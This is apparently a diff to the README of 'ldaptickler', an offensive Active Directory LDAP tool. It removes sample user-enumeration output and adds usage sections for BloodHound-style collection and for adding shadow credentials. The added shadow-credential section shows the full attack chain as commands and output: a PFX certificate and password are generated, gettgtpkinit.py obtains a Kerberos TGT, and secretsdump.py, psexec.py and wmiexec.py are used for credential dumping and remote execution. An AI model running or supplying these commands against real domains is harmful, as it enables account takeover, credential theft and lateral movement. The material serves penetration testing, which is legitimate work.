@@ -267,18 +267,6 @@ go run ./cmd/ldaptickler/ -d targetdomain.com -g --dc tip.spinninglikea.top  -s 
 [+] Attempting GSSAPI bind to tip.spinninglikea.top
 [+] Successfully connected to tip.spinninglikea.top
 [+] Searching for all users in LDAP with baseDN DC=spinninglikea,DC=top
-  DN: CN=Administrator,CN=Users,DC=spinninglikea,DC=top
-    sAMAccountName: [Administrator]
-  DN: CN=Guest,CN=Users,DC=spinninglikea,DC=top
-    sAMAccountName: [Guest]
-  DN: CN=krbtgt,CN=Users,DC=spinninglikea,DC=top
-    sAMAccountName: [krbtgt]
-  DN: CN=slacker,CN=Users,DC=spinninglikea,DC=top
-    sAMAccountName: [slacker]
-  DN: CN=No Inter.,CN=Users,DC=spinninglikea,DC=top
-    sAMAccountName: [Nointer]
-  DN: CN=lowprivguy,CN=Users,DC=spinninglikea,DC=top
-    sAMAccountName: [lowprivguy]
 ```
 
 ### Search with custom filter
@@ -297,6 +285,62 @@ go run ./cmd/ldaptickler/ --dc tip.spinninglikea.top  -s -u lowprivguy  -p searc
 [+] Successfully connected to tip.spinninglikea.top
 [+] Searching with specified filter: (&(samaccountname=Cert Publishers)(member=*)) in LDAP with baseDN DC=spinninglikea,DC=top
 ```
+
+### Bloodhound collector support
+```
+-d = specify the domain
+--dc = specify the domain controller
+-p = prompt for password
+-u = username
+-s = skip cert verification
+```
+```
+go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p collectbh
+[+] Enter Password: 
+[+] Attempting NTLM bind to tip.spinninglikea.top
+[+] Successfully connected to tip.spinninglikea.top
+[+] Running SharpHound-style collectors (collectors=[] dry-run=false) baseDN=DC=spinninglikea,DC=top
+[+] Successfully wrote collector output to ldaptickler-20251210-143604.zip
+```
+
+### Adding shadow credentials
+```
+-d = specify the domain
+--dc = specify the domain controller
+-p = prompt for password
+-u = username
+-s = skip cert verification
+```
+
+
+```
+go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p addshadowcredential slacker
+[+] Enter Password: 
+[+] Attempting NTLM bind to tip.spinninglikea.top
+[+] Successfully connected to tip.spinninglikea.top
+[+] Generating shadow credential PFX for account slacker
+[+] Successfully added shadow credential to account slacker
+[+] Credential ID: 2b1d8489d59aa4f00f4047ae6f77bdf1
+[+] PFX file saved to: ./slacker.pfx
+[+] PFX password: a72c37dddcbce5a4d4f15602b42d69bc
+
+[*] Ready to use with gettgtpkinit.py:
+    python3 gettgtpkinit.py -cert-pfx ./slacker.pfx -pfx-pass 'a72c37dddcbce5a4d4f15602b42d69bc' spinninglikea.top/slacker output.ccache
+
+[*] With specific DC:
+    python3 gettgtpkinit.py -cert-pfx ./slacker.pfx -pfx-pass 'a72c37dddcbce5a4d4f15602b42d69bc' -dc-ip <DC_IP> spinninglikea.top/slacker output.ccache
+
+[*] After obtaining the TGT:
+    export KRB5CCNAME=output.ccache
+    klist
+
+[*] Use the TGT with impacket tools:
+    psexec.py -k -no-pass spinninglikea.top/<HOSTNAME>
+    secretsdump.py -k -no-pass spinninglikea.top/<HOSTNAME>
+    wmiexec.py -k -no-pass spinninglikea.top/<HOSTNAME>
+```
+
+
 
 
 ## Initial features
